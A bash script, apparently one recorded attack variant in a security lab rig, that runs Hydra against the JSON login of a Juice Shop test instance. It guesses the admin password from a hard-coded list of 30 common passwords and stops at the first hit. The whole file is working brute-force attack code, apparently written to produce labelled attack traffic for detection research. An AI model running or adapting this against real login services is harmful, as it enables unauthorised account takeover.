#!/usr/bin/env bash
# ATK-04 variant a: Hydra guesses the admin's password against the JSON login with a short list,
# 4 parallel tasks, stops at the first hit (admin123), Hydra's own user agent (loud). Hydra 9.6 wants
# the failure string last; `1=` stops it treating the shop's 401 as HTTP auth.
# Runs inside the rig's tools container only (recording/record.sh).
# tool: hydra 9.6
# label: loud: hydra, 30 passwords, 4 tasks, hydra user agent
set -eu
printf '%s\n' 123456 password 12345678 qwerty 123456789 12345 1234 111111 1234567 dragon \
  123123 baseball abc123 football monkey letmein shadow master 666666 qwertyuiop \
  123321 mustang 1234567890 michael 654321 admin123 superman 1qaz2wsx 7777777 121212 > /tmp/passwords.txt
hydra -l admin@juice-sh.op -P /tmp/passwords.txt -f -t 4 -s 80 10.66.0.10 http-post-form \
  '/rest/user/login:{"email"\:"^USER^","password"\:"^PASS^"}:1=:H=Content-Type\: application/json:F=Invalid email'
